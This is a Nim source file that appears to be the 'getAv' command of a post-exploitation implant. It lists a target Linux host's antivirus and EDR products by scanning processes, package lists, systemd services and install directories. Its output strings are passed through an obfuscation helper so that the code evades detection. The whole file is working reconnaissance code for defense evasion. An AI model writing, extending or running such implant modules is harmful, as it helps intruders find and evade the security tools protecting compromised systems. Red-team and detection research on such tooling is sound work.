#[
    Cross-Platform getAv Command  
    Detect security software on Linux/Unix systems
    Adapted from Windows version for Unix-like systems
]#

import osproc, strutils, os
import ../../util/strenc

proc getAv*(): string =
    try:
        var avProducts: seq[string] = @[]
        
        when defined verbose:
            echo obf("DEBUG: Scanning for security software...")
        
        # Common antivirus/security software on Linux
        let avProcesses = [
            "clamd", "freshclam",        # ClamAV
            "avguard", "avgui",          # AVG
            "avast", "avastui",          # Avast
            "bdagent", "bdwtxag",        # Bitdefender
            "eseckd", "esecurityd",      # ESET
            "symantec", "sepagent",      # Symantec
            "mcafee", "mfeconsole",      # McAfee
            "kaspersky", "kavfs",        # Kaspersky
            "fsecure", "fshoster",       # F-Secure
            "sophosed", "sophos",        # Sophos
            "trendmicro", "tmccsf",      # Trend Micro
            "crowdstrike", "falcon",     # CrowdStrike
            "carbonblack", "cb",         # Carbon Black
            "sentinelone", "sentinelctl", # SentinelOne
            "cylance", "cyprotect"       # Cylance
        ]
        
        # Check running processes
        let psOutput = execProcess("ps aux").strip()
        for process in avProcesses:
            if process in psOutput.toLowerAscii():
                avProducts.add(obf("Process: ") & process)
        
        # Check installed packages (apt-based systems)
        try:
            let aptOutput = execProcess("dpkg -l | grep -i antivirus").strip()
            if aptOutput.len > 0:
                avProducts.add(obf("APT: antivirus packages found"))
        except:
            discard
        
        # Check snap packages
        try:
            let snapOutput = execProcess("snap list | grep -i antivirus").strip()
            if snapOutput.len > 0:
                avProducts.add(obf("SNAP: antivirus packages found"))
        except:
            discard
        
        # Check systemd services
        try:
            let systemdOutput = execProcess("systemctl list-units --type=service | grep -i antivirus").strip()
            if systemdOutput.len > 0:
                avProducts.add(obf("SYSTEMD: antivirus services found"))
        except:
            discard
        
        # Check common directories
        let avDirs = [
            "/opt/kaspersky",
            "/opt/eset", 
            "/opt/sophos",
            "/opt/symantec",
            "/opt/mcafee",
            "/opt/bitdefender",
            "/opt/crowdstrike",
            "/opt/carbonblack"
        ]
        
        for dir in avDirs:
            if dirExists(dir):
                avProducts.add(obf("Directory: ") & dir)
        
        when defined verbose:
            echo obf("DEBUG: Found ") & $avProducts.len & obf(" security indicators")
        
        if avProducts.len > 0:
            return obf("Security software detected:\n") & avProducts.join("\n")
        else:
            return obf("No security software detected")
        
    except Exception as e:
        when defined verbose:
            echo obf("DEBUG: getAv failed: ") & e.msg
        return obf("ERROR: Security software detection failed - ") & e.msg 